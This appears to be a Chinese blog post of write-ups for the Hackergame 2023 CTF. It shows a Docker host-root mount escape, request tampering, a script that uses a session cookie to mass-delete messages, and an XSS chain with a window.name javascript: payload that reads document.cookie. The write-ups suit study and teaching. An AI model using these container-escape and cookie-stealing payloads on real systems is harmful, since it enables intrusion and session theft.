---
title: Hackergame 2023 部分复现
date: '2024/1/16 10:51:01'
categories:
  - - ctf
description: Hackergame 2023 部分复现
tags:
abbrlink:
---

# Hackergame 2023

没想到最近事情这么多，23 年的居然得等到 24 年才发

## general

### 猫咪小测

```shell
12
23
CONFIG_TCP_CONG_BBR
ECOOP
```

### Docker for Everyone

```docker images``` 发现有 ```alpine``` 镜像
通过容器里面的 /mnt 将宿主机的根目录进行挂载

```shell
docker images
docker run -v /:/mnt -it alpine
cd mnt
ls -l
cat ./dev/shm/flag
```

### Git? Git!

使用 git reflog 查看完整的操作历史

```shell
┌──(zhou㉿kali)-[~/ML-Course-Notes]
└─$ ls -a
.  ..  .git  .github  LICENSE.md  README.md
                                                                                                                                      
┌──(zhou㉿kali)-[~/ML-Course-Notes]
└─$ git reflog
ea49f0c (HEAD -> main) HEAD@{0}: commit: Trim trailing spaces
15fd0a1 (origin/main, origin/HEAD) HEAD@{1}: reset: moving to HEAD~
505e1a3 HEAD@{2}: commit: Trim trailing spaces
15fd0a1 (origin/main, origin/HEAD) HEAD@{3}: clone: from https://github.com/dair-ai/ML-Course-Notes.git
```
最新的操作在最上面，其中操作分别是：
最新的提交，去除末尾空格
回退操作，回退到上一个提交
回退后的提交，同样是去除末尾空格
之前的克隆操作记录，从远程仓库克隆代码

所以结合提示 ```「刚刚一不小心，把 flag 提交到本地仓库里了。」马老师回答，「还好我发现了，撤销了这次提交，不然就惨了……」```，我们需要回退到 ```505e1a3``` 这个提交的位置

```shell
git reset --hard 505e1a3
```

在 README.md 文件中得到 flag

## web

### Hackergame 启动

burpsuite抓包修改

### 更深更暗

F12，源码里面有flag

### 赛博井字棋

先随便下两个，第三个棋子 burpsuite 抓包，然后修改成跟前两个一条直线的就行

### 组委会模拟器

要求是需要撤回其中有 flag 的消息，其中撤回的 "flag" 的格式为 hack[...]
群消息产生的速度非常快，需要写一个脚本来帮我们完成撤回任务

```js
function PostFunction(messageid) // 发送 POST 请求包
{
    // 设置要发送的id值
    const messageId = messageid;

    // 创建包含id参数的对象
    const data = {
    id: messageId
    };

    // 将对象转换为JSON字符串
    const jsonBody = JSON.stringify(data);

    const requestOptions = {
    method: 'POST',
    headers: {
        'Host': '202.38.93.111:10021',
        'Content-Length': jsonBody.length, // 更新Content-Length
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'Content-Type': 'application/json',
        'Origin': 'http://202.38.93.111:10021',
        'Referer': 'http://202.38.93.111:10021/',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cookie': 'session=eyJ0b2tlbiI6IjEyMjM6TUVVQ0lDYnVPZ1JYNC9ZcUMwbmD9In0.ZTzCMw.rb5el7IPE8bzx0OoX9PWkXbz1IU',
    },
    body: jsonBody
    };

    fetch('http://202.38.93.111:10021/api/deleteMessage', requestOptions)
    .then(response => {
        if (response.status === 200) {
        return response.json();
        } else {
        throw new Error('Failed to delete message');
        }
    })
    .then(data => {
        // 处理成功的响应数据
        console.log(data);
    })
    .catch(error => {
        // 处理错误
        console.error(error);
    });
}
// 使用 start 和 end 指针，避免重复扫描当前页面元素
var start = 0;
var end = 0;
function JudgeFunction() // 判断当前页面元素
{
    // 获取所有具有类名 "fakeqq-message left-chat" 的元素
    var elementsToConvert = document.querySelectorAll(".fakeqq-message.left-chat");
    // 获取当前具有类名 "fakeqq-message left-chat" 的元素数量
    var numberOfElements = elementsToConvert.length;
    end = numberOfElements;
    // 遍历每个元素并进行转换
    for (var i = start; i < end; i++) {
        var element = elementsToConvert[i];
        // 检查是否包含 hack[ 文本
        var messageText = element.querySelector(".fakeqq-message__bubble span").textContent;
        if (messageText.includes("这道题 flag 是hack[")) {
            PostFunction(i);
        }
    }
    start = end;
}
// 使用setInterval每秒执行aaa函数
setInterval(JudgeFunction, 200);
```

### HTTP 集邮册
100 请求已被接受，客户端应继续发送请求的剩余部分
```shell
GET /index.html HTTP/1.1\r\n
Expect: 100-continue\r\n
Host: example.com\r\n\r\n
```

200
```shell
GET / HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

206 服务器成功处理了部分 GET 请求
```shell
GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=10-20\r\n\r\n
```

304 自从上次请求后，请求的网页未修改过。这里服务器将检查资源的ETag值是否与客户端提供的相同
```shell
GET / HTTP/1.1\r\n
Host: example.com\r\n
If-None-Match: "64dbafc8-267"\r\n\r\n
```

400
```shell
GET / HT1TP/1.1\r\n
Host: example.com\r\n\r\n
```

404
```shell
GET /etc/passwd HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

405
```shell
DELETE / HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

412 服务器未满足请求者在请求中设置的其中一个前提条件
```shell
GET / HTTP/1.1\r\n
If-Match: "etag123"\r\n
Host: example.com\r\n\r\n
```

413 请求实体过大,服务器无法处理请求
```shell
POST /upload-file HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 1000000000\r\n\r\n
```

414 请求的 URI 过长
```shell
GET /1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111 HTTP/1.1\r\n
Host: 127.0.0.1\r\n\r\n
```

416 请求范围不符合要求
```shell
GET /index.html HTTP/1.1\r\n
Range: bytes=1000-2000\r\n
Host: example.com\r\n\r\n
```


505 HTTP 版本不受支持
```shell
GET / HTTP/2.1\r\n
Host: example.com\r\n\r\n
```

无状态 直接解析失败，肯定没状态
```shell
POST //1.1\r\n
Host: example.com\r\n\r\n
```

### 微积分计算小练习 2.0

给出的 bot 模拟了这样一个过程：你可以提交一段 HTML 代码，bot 会在本地启动一个 HTTP 服务器，然后 bot 会访问上面的练习网站，登录后在 cookie 中加入 JavaScript 可以访问到的经过 URL encode 之后的 flag，然后访问你的站点。Bot 不会输出任何网页内容。
题目环境不与互联网连接

题目给出的python脚本
```py
from selenium import webdriver
import selenium
import time
import os
import subprocess
import urllib.parse

# secret.py 不提供
from secret import FLAG, BOT_SECRET

os.mkdir("/dev/shm/xss-data")
os.mkdir("/dev/shm/chromium-data")
FLAG = urllib.parse.quote_plus(FLAG)
# 环境变量 "hackergame_token" 是你的 token
id = int(os.environ["hackergame_token"].split(":")[0])

# Stage 1
print("请输入你的 HTML 文件，以仅包含 EOF 三个字母的行结束，该文件需要小于 5KiB。")
print("我会在本地启动一个静态的 HTTP 服务器提供这个文件。")

code = ""
while True:
    line = input()
    if line == "EOF":
        break
    code += line + "\n"
    if len(code) > 1024 * 5:
        print("你的 HTML 太大了，尝试短一些吧！")
        exit(1)

with open("/dev/shm/xss-data/index.html", "w") as f:
    f.write(code)
sp = subprocess.Popen(
    ["python3", "-m", "http.server", "-b", "127.0.0.1", "10240"], cwd="/dev/shm/xss-data",
    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
)
time.sleep(1)
if sp.poll() is not None:
    print("启动 HTTP 服务器失败，请联系管理员。")
    exit(1)

# BOT 用 "BOT_SECRET" 以「管理员权限」登录，然后降权到和你一样
LOGIN_URL = f"http://web/?bot={BOT_SECRET}&id={id}"
# 在题目服务器上，bot 会访问 http://web
# 本地调试时，需要做如下修改：
# LOGIN_URL = "http://题目地址/?token=your_token"


# Stage 2
try:
    options = webdriver.ChromeOptions()
    options.add_argument("--no-sandbox")  # sandbox not working in docker
    options.add_argument("--headless")
    options.add_argument("--disable-gpu")
    options.add_argument("--user-data-dir=/dev/shm/user-data")
    os.environ["TMPDIR"] = "/dev/shm/chromium-data/"
    options.add_experimental_option("excludeSwitches", ["enable-logging"])

    with webdriver.Chrome(options=options) as driver:
        ua = driver.execute_script("return navigator.userAgent")
        print(" I am using", ua)

        print("- Logining...")
        driver.get(LOGIN_URL)
        time.sleep(4)

        print(" Putting secret flag...")
        driver.execute_script(f'document.cookie="flag={FLAG}"')
        time.sleep(1)

        print("- Now browsing your website...")
        driver.get("http://localhost:10240")
        time.sleep(4)

        print("Bye bye!")
except Exception as e:
    print("ERROR", type(e))
    print("I'll not give you exception message this time.")
```

可以看到，先让我们提交一段 html 代码，机器人会将这段 html 代码构建一个页面，放到 127.0.0.1:10240


提交评论的页面的 JavaScript 代码
```js
<script>
    function updateElement(selector, html) {
      document.querySelector(selector).innerHTML = html;
    }
    updateElement("#score", "你的得分是 <b>0</b> 分");
    updateElement("#comment", "这里是提交的评论内容");
</script>
```

updateElement() 方法提供了攻击点，虽然有限制：评论不超过 25 个字，不允许出现的字符 ```& > < ' ( ) ` . , %```

一开始想了很多办法，后来发现原来还能通过 ```"``` 逃逸出来，所以使用这样的 ```"+[location=name]+"``` 去绕过，构建一个数组，在其中将 location 赋值成 name 的值

接下来就是构造 html 代码，这里直接用大佬的 js 了
```js
<script>
  window.name =
    "javascript:document.querySelector('textarea').value=document.cookie.replace(/%/g,'#').substring(50,75);document.querySelector('button').click()";
  location.href = "http://web/result";
</script>
```

当访问构造的这个页面时，会将 window.name 设置我们构造的 JavaScript 代码的字符串，然后立即将页面重定向到 "http://web/result"，也就是访问提交评论的页面
因为在前面评论的页面我们构造了 ```"+[location=name]+"```，页面的当前 URL 修改为 url + name 中的值，所以会导致 name 中的恶意代码被执行，从而得到 cookie 的内容